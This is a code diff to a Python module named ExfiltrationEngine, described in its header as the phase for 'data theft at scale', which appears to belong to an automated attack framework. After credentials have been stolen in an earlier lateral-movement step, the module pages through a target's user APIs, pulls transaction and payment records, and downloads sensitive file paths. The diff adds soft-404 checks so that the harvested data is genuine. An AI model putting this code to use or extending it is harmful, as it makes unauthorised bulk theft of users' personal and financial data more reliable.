@@ -5,9 +5,11 @@ Phase 5: Data theft at scale, bulk API downloads, database dumps
 
 import asyncio
 import aiohttp
+import json
 import logging
 from typing import Dict, List, Any, Optional
 from .base import ExfiltrationModule
+from .soft404 import is_soft404
 import time
 
 logger = logging.getLogger(__name__)
@@ -31,10 +33,12 @@ class ExfiltrationEngine(ExfiltrationModule):
         self.exfiltrated_records: int = 0
         self.data_size_mb: float = 0.0
         self.extraction_methods: List[str] = []
+        self._sig = None   # soft-404 baseline signature from recon
 
     async def execute(self, context) -> Dict[str, Any]:
         """Execute data exfiltration attacks using lateral movement results"""
         logger.info(f"[Exfil] Starting exfiltration on {context.target_url}")
+        self._sig = getattr(context, "soft404_signature", None)
 
         # Only attempt if lateral movement was successful
         if not context.extracted_credentials:
@@ -82,8 +86,17 @@ class ExfiltrationEngine(ExfiltrationModule):
                         timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status == 200:
-                            data = await resp.json()
-                            users = data.get("users", [])
+                            raw = await resp.text(errors="replace")
+                            if is_soft404(resp.status, raw,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                logger.info("  ✗ Catch-all response — no real user API here")
+                                break
+                            try:
+                                data = json.loads(raw)
+                            except Exception:
+                                logger.info("  ✗ Response is not JSON — no real user API here")
+                                break
+                            users = data.get("users", []) if isinstance(data, dict) else []
 
                             if not users:
                                 logger.info(f"  Reached end at page {page}")
@@ -150,7 +163,14 @@ class ExfiltrationEngine(ExfiltrationModule):
                         timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status == 200:
-                            data = await resp.json()
+                            raw = await resp.text(errors="replace")
+                            if is_soft404(resp.status, raw,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                continue   # catch-all page, not a real endpoint
+                            try:
+                                data = json.loads(raw)
+                            except Exception:
+                                continue   # HTML, not an API
                             records = len(data.get("transactions", data.get("payments", [])))
 
                             if records > 0:
@@ -193,7 +213,10 @@ class ExfiltrationEngine(ExfiltrationModule):
                     url = f"{target}{path}"
                     async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                         if resp.status == 200:
-                            content = await resp.text()
+                            content = await resp.text(errors="replace")
+                            if is_soft404(resp.status, content,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                continue   # catch-all page — file does not exist
                             size = len(content) / (1024 * 1024)
                             self.data_size_mb += size
                             files_found.append(path)
